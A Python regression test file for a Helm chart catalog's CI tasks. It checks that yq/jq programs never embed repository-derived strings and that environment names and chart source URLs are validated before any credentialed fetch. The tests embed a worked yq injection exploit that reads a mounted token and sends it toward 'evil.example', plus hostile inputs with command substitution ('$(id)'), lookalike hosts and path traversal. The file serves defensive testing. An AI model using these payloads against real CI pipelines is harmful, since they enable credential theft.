#!/usr/bin/env python3
"""A string from the repository must never become part of a program (yq, jq, sed) or choose where a credentialed fetch goes.

The environment name in `select(.name == "${env}")` was a directory name from the PR's changed paths, filtered only by `[^/]+`; yq's
`load()` can read a mounted token into a program's result. This file checks that

  structure  no yq or jq program in any catalog task or lib script is a double-quoted string with a variable in it, except the ones named
             below with the reason each is safe (a test that fails when a new one appears or an old one is fixed and left on the list);
  guards     the three fetch steps (clearance-gate, policy-validation-gate, validate-values) check every path-derived name against the
             platform's name rule before using it, pass the name to yq with strenv(), and check a chart source against the allowed hosts
             before any fetch; the exploit string from the review is refused, and if it did reach yq it is data, not program text;
  sources    a hostile chart repoURL (another host, userinfo, a lookalike host, a scheme, a newline, a port, a path escape) is refused.

Needs helm, yq, pyyaml, bash.   Run:  python3 charts/glidepath-catalog/tests/program_text_test.py
"""
import glob
import os
import re
import subprocess
import tempfile
import unittest

import yaml

ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "..", ".."))
CATALOG = os.path.join(ROOT, "charts", "glidepath-catalog")
r = subprocess.run(["helm", "template", "c", CATALOG, "-f", os.path.join(CATALOG, "tests", "values.example.yaml")], capture_output=True, text=True)
assert r.returncode == 0, r.stderr
DOCS = [d for d in yaml.safe_load_all(r.stdout) if d]
TASKS = {d["metadata"]["name"]: d for d in DOCS if d["kind"] == "Task"}
GATE_FETCH = {"clearance-gate": "fetch", "policy-validation-gate": "fetch", "validate-values": "clone-and-list"}

# yq/jq programs in double quotes with a variable in them that are safe, and why. Keyed by (task or file, the program text).
SAFE_PROGRAMS = {
    ("promote", '$1 // \\"\\"'): "read_field's callers pass literal field names (read_field release.image.digest ...), never repository text",
    ("clearance-gate", "${filter}"): "filter is one of two constant programs set a few lines above it (del(.admission, ...), del(.objects[] | select(.op == unchanged)))",
    ("stage-preflight", 'if ($1) == true then \\"true\\" else \\"false\\" end'): "flag's callers pass literal paths (flag .governance.sast ...)",
    ("clearance-gate", "$3"): "release-source.sh's _rs_pages: every caller passes a literal jq filter (.commits, [.[] | select(.merged_at != null) | .number] ...), never repository text",
    ("release-source.sh", "$3"): "the same helper, in the library",
    ("clearance-gate", "${strip}"): "release-source.sh: strip is a constant program set in the function (it drops the image fields before comparing a release PR's tree)",
    ("release-source.sh", "${strip}"): "the same constant, in the library",
    ("push-image", "$2"): "oci-layout.sh's _oci_json/_oci_get: the callers are the library's own validators, with literal jq expressions",
    ("oci-layout.sh", "$2"): "the same helpers, in the library",
    ("push-image", "${_OCI_JQ_DEFS}"): "a constant block of jq function definitions in the library",
    ("oci-layout.sh", "${_OCI_JQ_DEFS}"): "the same constant",
    ("push-image", "[(${path})? | objects | keys_unsorted[]] | all(. as \\$k | \\$a | index(\\$k) != null)"): "_oci_keys_in: path is a literal expression from the library's validators; the allowed keys go in with --argjson",
    ("oci-layout.sh", "[(${path})? | objects | keys_unsorted[]] | all(. as \\$k | \\$a | index(\\$k) != null)"): "the same helper, in the library",
}

OPTION_ARITY = {"--arg": 2, "--argjson": 2, "--slurpfile": 2, "--rawfile": 2, "-o": 1, "-p": 1, "-I": 1, "--indent": 1, "-f": 1, "--from-file": 1, "--output-format": 1, "--input-format": 1}
SUBCOMMANDS = {"eval", "eval-all", "e", "ea"}


def lex(rest):
    """Tokens of the rest of a shell line, quote-aware: (text, quote char or '') ; an unterminated double quote runs to the end."""
    out, i, n = [], 0, len(rest)
    while i < n:
        c = rest[i]
        if c in " \t":
            i += 1
        elif c in "|;<>)&":
            break
        elif c == "'":
            j = rest.find("'", i + 1)
            j = n if j < 0 else j
            out.append((rest[i + 1:j], "'"))
            i = j + 1
        elif c == '"':
            j, buf = i + 1, []
            while j < n and rest[j] != '"':
                if rest[j] == "\\" and j + 1 < n:
                    buf.append(rest[j:j + 2])
                    j += 2
                else:
                    buf.append(rest[j])
                    j += 1
            out.append(("".join(buf), '"'))
            i = j + 1
        else:
            j = i
            while j < n and rest[j] not in " \t|;<>)&":
                j += 1
            out.append((rest[i:j], ""))
            i = j
    return out


def programs(text):
    """(tool, program text, quote) for each yq/jq invocation in the non-comment lines of a script."""
    found = []
    lines = [l for l in text.split("\n") if not l.strip().startswith("#")]
    for line in lines:
        for m in re.finditer(r"(?:^|[|;&(!]|\$\(|\bthen\b|\bdo\b|\bif\b|\s)\s*(yq|jq)\s", line):
            toks = lex(line[m.end():])
            k = 0
            while k < len(toks):
                t, q = toks[k]
                if q == "" and t in SUBCOMMANDS:
                    k += 1
                elif q == "" and t.startswith("-"):
                    k += 1 + OPTION_ARITY.get(t, 0)
                else:
                    found.append((m.group(1), t, q))
                    break
    return found


class Structure(unittest.TestCase):
    def sources(self):
        for name, d in TASKS.items():
            for s in d["spec"]["steps"]:
                yield name, s.get("script", "")
        for path in glob.glob(os.path.join(CATALOG, "files", "lib", "*.sh")):
            yield os.path.basename(path), open(path).read()
        yield "_helpers.tpl", open(os.path.join(CATALOG, "templates", "_helpers.tpl")).read()

    def test_no_yq_or_jq_program_is_a_double_quoted_string_with_a_variable(self):
        seen, bad = set(), []
        total = 0
        for name, text in self.sources():
            for tool, prog, quote in programs(text):
                total += 1
                if quote == '"' and re.search(r"\$[{(A-Za-z0-9_]", prog):
                    if (name, prog) in SAFE_PROGRAMS:
                        seen.add((name, prog))
                    else:
                        bad.append((name, tool, prog[:120]))
        self.assertGreater(total, 100, "the scan found too few programs: it would be vacuous")
        self.assertEqual(bad, [], "a yq/jq program with a variable in its text: pass the value with strenv()/env() or --arg")
        self.assertEqual(seen, set(SAFE_PROGRAMS), "an allowlisted program is gone: remove it from SAFE_PROGRAMS")

    def test_no_jsonpath_expression_is_built_from_a_variable(self):
        bad = []
        for name, text in self.sources():
            for line in text.split("\n"):
                if re.search(r'jsonpath="[^"]*\$\{', line) and not line.strip().startswith("#"):
                    bad.append((name, line.strip()[:100]))
        self.assertEqual(bad, [])

    def test_a_test_name_is_checked_before_it_selects_a_file(self):
        text = "\n".join(s.get("script", "") for s in TASKS["run-testworkflow"]["spec"]["steps"])
        self.assertLess(text.index('[[ -z "${n}" || "${n}" =~'), text.index('WORKFLOW_FILE="glidepath/${TEST_NAME}.yaml"'))

    def test_the_scan_sees_the_old_bug(self):
        old = '''resolved="$(echo "${cicd}" | yq -o json "{\\"a\\": (.b[] | select(.name == \\"${env}\\"))}" 2>/dev/null)"'''
        self.assertEqual([(t, q) for t, _, q in programs(old)], [("yq", '"')])
        fixed = '''resolved="$(echo "${cicd}" | ENV_NAME="${env}" yq -o json '{"a": (.b[] | select(.name == strenv(ENV_NAME)))}' 2>/dev/null)"'''
        self.assertEqual([(t, q) for t, _, q in programs(fixed)], [("yq", "'")])
        self.assertEqual([q for _, _, q in programs('''jq -r --arg x "${v}" '.a' <<<"${j}"''')], ["'"])

    def test_each_fetch_step_guards_names_and_sources_before_it_uses_them(self):
        for task, step in GATE_FETCH.items():
            text = [s for s in TASKS[task]["spec"]["steps"] if s["name"] == step][0]["script"]
            self.assertIn("# BEGIN input-guards", text, task)
            self.assertIn('strenv(ENV_NAME)', text, task)
            code = "\n".join(l for l in text.split("\n") if not l.strip().startswith("#"))
            # the guard comes before the first use of an environment name in a program and before every fetch of a chart
            first_yq = code.index("ENV_NAME=")
            self.assertIn("valid_name", code[:first_yq] if task == "validate-values" else code)
            if task != "validate-values":
                self.assertLess(code.index('valid_env_plan /work/envs.txt'), first_yq, task)
            self.assertLess(code.index("valid_chart_source"), code.index("oras pull"), task)
            self.assertLess(code.index("valid_chart_source"), code.index("fetch_repo \"${repo_url}\"") if "fetch_repo \"${repo_url}\"" in code else code.index("git -C \"/work/charts/${n}\" fetch"), task)


def guards_script():
    text = [s for s in TASKS["clearance-gate"]["spec"]["steps"] if s["name"] == "fetch"][0]["script"]
    return text[text.index("# BEGIN input-guards"):text.index("# END input-guards")]


class Guards(unittest.TestCase):
    def run_guard(self, call, **env):
        """The guards as the fetch step carries them, run with the values in the environment (never in the program text)."""
        p = subprocess.run(["bash", "-c", guards_script() + "\n" + call], capture_output=True, text=True, env=dict(os.environ, **env))
        return p.returncode

    def test_names(self):
        for ok in ("prod", "hangar-prod", "pr-12", "a", "a1-b2"):
            self.assertEqual(self.run_guard('valid_name "${N}"', N=ok), 0, ok)
        for bad in ('prod") | {"chart": {"repoURL": (load(strenv(X)))}} | select(true or "', "Prod", "-x", "x-", "a b", "a;b", "$(id)", "a`id`", "a\nb", "a|b",
                    "x" * 64, "", "a.b", "a_b", "..", "prod\n"):
            self.assertNotEqual(self.run_guard('valid_name "${N}"', N=bad), 0, repr(bad))

    def test_the_review_exploit_is_refused_before_yq_runs_and_is_only_data_if_it_gets_there(self):
        exploit = 'prod") | {"chart": {"repoURL": ("https://evil.example/" + (strenv(X)|.[0:1]) + load(strenv(X)))}} | select(true or "'
        with tempfile.TemporaryDirectory() as tmp:
            envs = os.path.join(tmp, "envs.txt")
            open(envs, "w").write("hangar-prod|%s\n" % exploit)
            self.assertNotEqual(self.run_guard('valid_env_plan "%s"' % envs), 0)
            open(envs, "w").write("hangar-prod|prod\nhangar-prod|dev\n")
            self.assertEqual(self.run_guard('valid_env_plan "%s"' % envs), 0)
            # the program the fetch steps run, taken from the rendered Task, with the exploit as the value
            secret = os.path.join(tmp, "token")
            open(secret, "w").write("PODTOKEN")
            cicd = os.path.join(tmp, "cicd.yaml")
            open(cicd, "w").write("deploy:\n  chart: {repoURL: 'https://github.com/o/c', path: x}\n  environments:\n    - name: prod\n      chart: {path: y}\n")
            for task, step in GATE_FETCH.items():
                text = [s for s in TASKS[task]["spec"]["steps"] if s["name"] == step][0]["script"]
                m = re.search(r"ENV_NAME=\"\$\{env\}\" yq -o json '(.*?)' 2>/dev/null", text, re.S)
                self.assertIsNotNone(m, task)
                env = dict(os.environ, ENV_NAME=exploit, X=secret)
                p = subprocess.run(["yq", "-o", "json", m.group(1), cicd], capture_output=True, text=True, env=env)
                self.assertNotIn("PODTOKEN", p.stdout + p.stderr, task)
                self.assertNotIn("evil.example", p.stdout, task)
                good = subprocess.run(["yq", "-o", "json", m.group(1), cicd], capture_output=True, text=True, env=dict(os.environ, ENV_NAME="prod"))
                self.assertIn('"path": "y"', good.stdout, task)

    def test_chart_sources(self):
        ok = [("https://github.com/example-org/airframe.git", "main", "charts/airframe-application", ""),
              ("https://github.com/o/r", "v1.2.3", ".", ""),
              ("https://github.com/o/r", "0123456789abcdef0123456789abcdef01234567", "", ""),
              ("oci://ghcr.io/example-org/charts", "1.0.0", ".", "airframe-application")]
        call = 'valid_chart_source "${U}" "${R}" "${P}" "${C}"'
        for a in ok:
            self.assertEqual(self.run_guard(call, U=a[0], R=a[1], P=a[2], C=a[3]), 0, a)
        hostile = [
            ("https://evil.example/o/r", "main", ".", ""),
            ("https://github.com.evil.example/o/r", "main", ".", ""),
            ("https://github.com@evil.example/o/r", "main", ".", ""),
            ("https://user:pw@github.com/o/r", "main", ".", ""),
            ("http://github.com/o/r", "main", ".", ""),
            ("git://github.com/o/r", "main", ".", ""),
            ("file:///etc", "main", ".", ""),
            ("ssh://git@github.com/o/r", "main", ".", ""),
            ("https://github.com:8443/o/r", "main", ".", ""),
            ("https://github.com/o/r?x=https://evil.example", "main", ".", ""),
            ("https://github.com/o/r#frag", "main", ".", ""),
            ("https://github.com/o/r\nhttps://evil.example", "main", ".", ""),
            ("https://github.com/o/r extra", "main", ".", ""),
            ("https://github.com/o", "main", ".", ""),
            ("https://github.com/o/r/extra", "main", ".", ""),
            ("https://github.com/o/r$(id)", "main", ".", ""),
            ("https://github.com/o/r", "-x", ".", ""),
            ("https://github.com/o/r", "main..x", ".", ""),
            ("https://github.com/o/r", "a b", ".", ""),
            ("https://github.com/o/r", "main", "../x", ""),
            ("https://github.com/o/r", "main", "/etc", ""),
            ("https://github.com/o/r", "main", "a/../../b", ""),
            ("https://github.com/o/r", "main", "a b", ""),
            ("oci://evil.example/charts", "1.0.0", ".", "c"),
            ("oci://ghcr.io.evil.example/charts", "1.0.0", ".", "c"),
            ("oci://ghcr.io/charts", "1.0.0", ".", "../c"),
            ("oci://ghcr.io/charts", "1.0.0", ".", ""),
            ("oci://ghcr.io/charts", "1.0.0", ".", "c;id"),
            ("", "main", ".", ""),
        ]
        for a in hostile:
            self.assertNotEqual(self.run_guard(call, U=a[0], R=a[1], P=a[2], C=a[3]), 0, a)

    def test_a_chart_spec_the_resolver_cannot_read_fails_closed(self):
        def ok(cicd):
            y = subprocess.run(["yq", "-o", "json", "."], input=cicd, capture_output=True, text=True).stdout
            return subprocess.run(["bash", "-c", guards_script() + "\nchart_specs_ok"], input=y, capture_output=True, text=True).returncode == 0
        self.assertTrue(ok("deploy:\n  chart: {repoURL: https://github.com/o/c}\n  environments:\n    - name: prod\n      chart: {path: x}\n"))
        self.assertTrue(ok("deploy:\n  environments:\n    - name: prod\n"))
        self.assertTrue(ok("build: {agent: nodejs-20}\n"))
        for bad in ("deploy:\n  chart: str\n", "deploy:\n  chart: [a]\n", "deploy:\n  environments:\n    - name: prod\n      chart: str\n",
                    "deploy:\n  environments: prod\n", "deploy: str\n", "deploy:\n  environments:\n    - prod\n"):
            self.assertFalse(ok(bad), bad)

    def test_the_allowed_hosts_come_from_the_values(self):
        r = subprocess.run(["helm", "template", "c", CATALOG, "-f", os.path.join(CATALOG, "tests", "values.example.yaml"), "--set", "chartSources.gitHosts={git.example.org}",
                            "--set", "chartSources.ociHosts={registry.example.org}", "--show-only", "templates/tasks/clearance-gate.yaml"], capture_output=True, text=True)
        self.assertEqual(r.returncode, 0, r.stderr)
        self.assertIn('ALLOWED_GIT_HOSTS="git.example.org github.com"', r.stdout)
        self.assertIn('ALLOWED_OCI_HOSTS="registry.example.org"', r.stdout)


class PathShapes(unittest.TestCase):
    """Only a path of the environment shape is an environment. Other changed paths are ignored as they were before; a path that has the shape
    with an invalid environment name refuses the run. Run on the real fetch scripts' own blocks (clearance-gate, policy-validation-gate)."""

    GATES = ("clearance-gate", "policy-validation-gate")

    def block(self, task):
        text = [s for s in TASKS[task]["spec"]["steps"] if s["name"] == "fetch"][0]["script"]
        a = text.index(": > /work/envs.txt")
        b = text.index("\n", text.index("valid_env_plan /work/envs.txt"))
        return text[text.index("# BEGIN input-guards"):text.index("# END input-guards")] + "\n" + text[a:b]

    def run_block(self, task, changed, tree=()):
        """-> (exit code, the envs.txt it wrote, its output); `tree` are files that exist in the checkout (a cluster's environments)."""
        with tempfile.TemporaryDirectory() as tmp:
            for f in list(tree) + [c for c in changed if "/" in c]:
                os.makedirs(os.path.dirname(os.path.join(tmp, f)), exist_ok=True)
                open(os.path.join(tmp, f), "w").write("x: 1\n")
            os.makedirs(os.path.join(tmp, "w"))
            if task == "clearance-gate":
                import json
                head = "files=%s\n" % repr(json.dumps([{"filename": f} for f in changed]))
            else:
                head = "changed=$%s\n" % repr("\n".join(changed))
            script = "set -euo pipefail\ncd %s\n%s%s\n" % (tmp, head, self.block(task).replace("/work", os.path.join(tmp, "w")))
            p = subprocess.run(["bash", "-c", script], capture_output=True, text=True)
            envs = open(os.path.join(tmp, "w", "envs.txt")).read().split()
            return p.returncode, envs, p.stdout + p.stderr

    def test_an_environment_is_read(self):
        for task in self.GATES:
            rc, envs, out = self.run_block(task, ["hangar-prod/prod/values.yaml", "hangar-prod/dev/release.yaml"])
            self.assertEqual((rc, sorted(envs)), (0, ["hangar-prod|dev", "hangar-prod|prod"]), (task, out))

    def test_a_path_that_is_not_an_environment_is_ignored(self):
        for task in self.GATES:
            for path in ("values.yaml", "docs/values.yaml", "docs.v1/guide/values.yaml", "Docs/Guide/release.yaml", "Charts/x_y/values.yaml",
                         "a/b/c/values.yaml", "README.md", "Docs/base.yaml"):
                rc, envs, out = self.run_block(task, [path])
                self.assertEqual((rc, envs), (0, []), (task, path, out))
            rc, envs, out = self.run_block(task, ["docs.v1/x/values.yaml", "hangar-prod/dev/release.yaml"])
            self.assertEqual((rc, envs), (0, ["hangar-prod|dev"]), (task, out))

    def test_an_environment_shape_with_an_invalid_name_refuses_the_run_without_printing_the_name(self):
        for task in self.GATES:
            for path in ("hangar-prod/Prod/values.yaml", "hangar-prod/pr_1/release.yaml", "hangar-prod/a.b/values.yaml", "hangar-prod/-x/values.yaml"):
                rc, envs, out = self.run_block(task, [path])
                self.assertEqual(rc, 1, (task, path))
                self.assertIn("not a plain name", out)
                self.assertNotIn(path.split("/")[1], out)

    def test_a_cluster_base_file_brings_in_its_environments_and_a_bad_directory_name_refuses(self):
        for task in self.GATES:
            rc, envs, out = self.run_block(task, ["hangar-prod/base.yaml"], tree=["hangar-prod/dev/values.yaml", "hangar-prod/prod/release.yaml"])
            self.assertEqual((rc, sorted(envs)), (0, ["hangar-prod|dev", "hangar-prod|prod"]), (task, out))
            rc, envs, out = self.run_block(task, ["hangar-prod/base.yaml"], tree=["hangar-prod/dev/values.yaml", "hangar-prod/Bad_Dir/values.yaml"])
            self.assertEqual(rc, 1, task)


class ValuesCheckPathShapes(unittest.TestCase):
    """validate-values: a changed values file that is not of the environment shape is validated as a file and is not an environment."""

    def run_loop(self, files):
        text = [s for s in TASKS["validate-values"]["spec"]["steps"] if s["name"] == "clone-and-list"][0]["script"]
        a = text.index('if [[ -n "${cicd}" && -s /work/files.txt ]]; then')
        b = text.index("\nfi\n", text.index("done < /work/files.txt", a)) + len("\nfi\n")
        with tempfile.TemporaryDirectory() as tmp:
            os.makedirs(os.path.join(tmp, "w"))
            open(os.path.join(tmp, "w", "files.txt"), "w").write("\n".join(files) + "\n")
            cicd = "deploy:\n  environments:\n    - name: prod\n"
            script = ("set -euo pipefail\n%s\ncicd=%s\nDEFAULT_CHART_REPO_URL=https://github.com/o/c DEFAULT_CHART_PATH=charts/x\n%s\ncat %s/w/files.txt\n"
                      % (text[text.index("# BEGIN input-guards"):text.index("# END input-guards")], "$" + repr(cicd), text[a:b].replace("/work", os.path.join(tmp, "w")), tmp))
            p = subprocess.run(["bash", "-c", script], capture_output=True, text=True)
            return p.returncode, p.stdout.split(), p.stdout + p.stderr

    def test_files_that_are_not_environments_are_kept_and_a_bad_environment_name_refuses(self):
        rc, kept, out = self.run_loop(["values.yaml", "x/values.yaml", "docs.v1/guide/values.yaml", "Docs/Guide/values.yaml", "a/b/c/values.yaml", "Docs/base.yaml"])
        self.assertEqual(rc, 0, out)
        self.assertEqual(sorted(kept), sorted(["values.yaml", "x/values.yaml", "docs.v1/guide/values.yaml", "Docs/Guide/values.yaml", "a/b/c/values.yaml", "Docs/base.yaml"]))
        rc, kept, out = self.run_loop(["hangar-prod/prod/values.yaml"])
        self.assertEqual((rc, kept), (0, ["hangar-prod/prod/values.yaml"]), out)
        rc, kept, out = self.run_loop(["hangar-prod/Prod/values.yaml"])
        self.assertEqual(rc, 1)
        self.assertIn("not a plain name", out)
        self.assertNotIn("Prod", out.replace("FAIL", ""))


if __name__ == "__main__":
    unittest.main()
